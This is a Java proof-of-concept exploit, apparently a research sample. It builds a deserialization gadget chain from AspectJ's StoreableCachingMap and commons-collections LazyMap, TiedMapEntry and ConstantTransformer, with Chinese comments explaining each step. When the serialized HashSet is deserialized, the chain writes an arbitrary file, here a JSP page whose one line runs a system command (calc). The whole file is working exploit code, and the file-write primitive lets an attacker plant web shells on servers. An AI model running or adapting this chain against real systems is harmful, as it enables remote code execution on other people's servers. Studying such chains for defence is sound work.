package com.example.reserial;

import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
public class aspectjweaver {
    /*
    commons-collections:3.2.2
    aspectjweaver:1.9.2   spring AOP做切入点表达式、aop相关注解时需要
     */
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException {
        String fileName = "test.jsp";
        String tmp = "<%java.lang.Runtime.getRuntime().exec(\"calc\");%>\n";
        byte[] exp = tmp.getBytes(StandardCharsets.UTF_8);
        // 创建StoreableCachingMap对象
        Constructor<?> constructor = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap").getDeclaredConstructor(String.class, int.class);
        constructor.setAccessible(true);
        Object map = constructor.newInstance(".", 12);
        // 把保存了文件内容的对象exp放到ConstantTransformer中，后面调用ConstantTransformer#transform(xx)时，返回exp对象
        ConstantTransformer constantTransformer = new ConstantTransformer(exp);
        // 用LazyMap和TiedMapEntry包装Transformer类，以便于将触发点扩展到hashCode、toString、equals等方法
        Map lazyMap = LazyMap.decorate((Map) map, constantTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, fileName);
        // 反序列化漏洞的启动点: HashSet
        HashSet hashSet = new HashSet(1);
        // 随便设置一个值，后面反射修改为tiedMapEntry，直接add(tiedMapEntry)会在序列化时本地触发payload
        hashSet.add("fff");
        // 获取HashSet中的HashMap对象
        Field field;
        try {
            field = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e){
            field = HashSet.class.getDeclaredField("backingMap");  // jdk
        }
        field.setAccessible(true);
        HashMap innerMap = (HashMap) field.get(hashSet);
        // 获取HashMap中的table对象
        Field field1;
        try{
            field1 = HashMap.class.getDeclaredField("table");
        }catch (NoSuchFieldException e){
            field1 = HashMap.class.getDeclaredField("elementData");
        }
        field1.setAccessible(true);
        Object[] array = (Object[]) field1.get(innerMap);
        // 从table对象中获取索引0 或 1的对象，该对象为HashMap$Node类
        Object node = array[0];
        if(node==null){
            node = array[1];
        }
        // 从HashMap$Node类中获取key这个field，并修改为tiedMapEntry
        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        }catch (NoSuchFieldException e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node, tiedMapEntry);
        // 序列化和反序列化测试
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("serialize.ser"));
        objectOutputStream.writeObject(hashSet);
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("serialize.ser"));
        objectInputStream.readObject();
    }
}